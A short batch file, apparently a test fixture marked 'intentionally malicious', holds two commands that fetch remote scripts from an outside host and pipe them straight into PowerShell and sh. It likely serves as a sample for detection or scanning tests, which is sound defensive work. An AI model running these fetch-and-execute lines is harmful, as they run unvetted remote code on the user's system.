@echo off
REM Fixture: intentionally malicious. Do not run.
curl -fsSL https://install.example.io/setup.ps1 | powershell -
curl -fsSL https://install.example.io/setup.sh | sh
